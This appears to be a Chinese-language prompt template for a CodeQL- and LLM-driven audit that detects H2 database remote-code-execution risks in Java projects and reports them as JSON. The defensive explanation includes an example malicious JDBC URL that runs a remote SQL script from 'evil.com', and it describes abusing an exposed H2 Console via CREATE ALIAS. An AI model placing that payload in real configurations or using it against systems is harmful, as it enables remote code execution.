---
description: H2_RCE 漏洞审计（CodeQL + LLM 分析）
---

对指定 CodeQL 数据库执行 H2_RCE 漏洞审计，以 JSON 数组输出发现报告。

**数据库路径**：$ARGUMENTS

---

## 阶段 1：运行 CodeQL 查询

查询文件位于本项目 `src/codeql/java/h2_rce/` 目录。

```bash
AUDIT_TMP=$(mktemp -d)
DB="$ARGUMENTS"

for QL in h2_console h2_init_script h2_datasource; do
  "$AUDIT_PYTHON" scripts/codeql_locked.py query run --database "$DB" \
    --output "$AUDIT_TMP/${QL}.bqrs" \
    "src/codeql/java/h2_rce/${QL}.ql" 2>&1 || true
  [ -f "$AUDIT_TMP/${QL}.bqrs" ] && \
    codeql bqrs decode "$AUDIT_TMP/${QL}.bqrs" \
      --format=json --output "$AUDIT_TMP/${QL}.json" 2>&1 || true
done
```

读取所有生成的 JSON 文件（$AUDIT_TMP/*.json）的内容。

---

## 阶段 2：漏洞判断

# H2 数据库 RCE 风险检测专家

你是专精 H2 数据库安全风险的审计专家。

## 核心概念

H2 是 Java 生态常见的嵌入式数据库，在开发/测试环境中广泛使用。
其存在两类高危 RCE 路径：

1. **H2 Console 未授权访问**：`spring.h2.console.enabled=true` 且无认证防护时，
   攻击者可访问 `/h2-console`，通过内置 SQL 控制台执行 `CREATE ALIAS` 调用 Java 代码。
   H2 1.4.199（CVE-2022-23221）：本地文件路径模式下即可触发 RCE，无需网络认证。

2. **JDBC URL INIT 脚本**：`jdbc:h2:mem:test;INIT=RUNSCRIPT FROM 'http://evil.com/x.sql'`
   在建立连接时自动执行远程脚本。

## 推理步骤

### 1. 一次性收集所有证据
依次调用三个工具，不要在中间停下分析：
- `find_h2_console_config`
- `find_h2_init_script`
- `find_h2_datasource`

### 2. 综合判断
结合 tech_profile 中的依赖版本信息：

- **H2 Console 暴露判断**：
  - `find_h2_console_config` 返回结果 → 说明代码中有 console 引用
  - tech_profile 依赖包含 `com.h2database:h2:1.4.x` → 版本危险
  - 若无 SecurityFilterChain 保护 `/h2-console/**` → **CRITICAL RCE**
  - 若有 Spring Security 但 Actuator 配置允许全部端点 → **HIGH**

- **INIT 脚本判断**：
  - `find_h2_init_script` 返回结果 → 直接漏洞，**CRITICAL**

- **生产环境判断**：
  - 若仅在 `test/` 目录下发现 → 风险降低为 MEDIUM
  - 若在 `main/resources/application.properties` 中 → CRITICAL

## 判断标准

| 场景 | 严重度 |
|------|--------|
| H2 Console 启用 + 无认证 + H2 < 2.x | CRITICAL |
| H2 Console 启用 + 有认证但版本 < 2.x | HIGH |
| JDBC URL 含 INIT/RUNSCRIPT 参数 | CRITICAL |
| 仅测试目录中 H2 配置 | MEDIUM |
| 置信度 < 0.6 | 跳过 |

使用 `rule_id`：`h2-console-exposed`、`h2-init-script`。

**build-mode=none 限制**：CodeQL 数据库以 build-mode=none 构建，跨方法污点路径不完整属正常现象。
Sink 参数为**非字面量表达式**（变量、方法调用、字符串拼接）即可上报，不要因为缺少完整 Source→Sink 路径而拒绝上报。

---

## 阶段 3：输出报告

以 JSON 数组格式输出所有发现，无发现时输出 `[]`。

```json
[
  {
    "rule_id": "...",
    "title": "...",
    "severity": "CRITICAL|HIGH|MEDIUM|LOW",
    "confidence": 0.80,
    "file": "src/main/java/...",
    "line": 42,
    "description": "具体漏洞描述",
    "evidence": "引用查询结果中的关键字段"
  }
]
```

输出时**只输出 JSON 数组**，不要添加任何其他说明文字。
